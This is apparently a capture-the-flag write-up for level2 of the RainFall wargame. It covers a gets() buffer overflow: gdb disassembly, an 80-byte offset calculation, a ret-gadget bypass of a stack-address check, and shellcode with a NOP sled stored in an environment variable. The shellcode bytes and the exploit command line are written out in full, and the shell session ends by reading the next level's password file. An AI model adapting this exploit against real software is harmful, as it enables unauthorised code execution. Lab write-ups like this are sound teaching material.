Like in level1, there is a call to `gets()`, we have to find the buffer size.

In `p()` we can see :
```
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
```
 eax value is at address `ebp-0x4c`, and `seip` is by convention at `ebp+0x04` so we do the maths :
```
>>> 0x04 - (-0x4c)
80
```
The buffer size is `80`
```
Starting program: /home/user/level2/level2 <<< $(python -c "print 'A' * 80 + 'BBBB'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)  info reg ebp eip
ebp            0x41414141	0x41414141
eip            0x42424242	0x42424242
```
Those two lines after the call to `gets()` are showing a protection against a stack injection, no nop sleds is possible.
```
0x080484fb      and eax, 0xb0000000
0x08048500      cmp eax, 0xb0000000
```
For example, if we try to target an address after the `gets()` like `ret => 0x0804853e` and then go 4 bytes after the original EIP address `info frame` to target the NOP `0xbffff71c + 4 = 0xBFFFF720`, the program calls `exit`.

If we put our shellcode in an environment variable, we be sure that it's not alterated with the buffer.

take a shellcode:
http://shell-storm.org/shellcode/files/shellcode-827.php

```
export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
```
the NOP are added to optimize the chance that the ret address points to it so the SHELLCODE will be executed.

Get SHELLCODE var address with exploit then
```
level2@RainFall:~$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + [shellcode address] " & cat) | ./level2
whoami
level3
cat /home/user/level3/.pass
```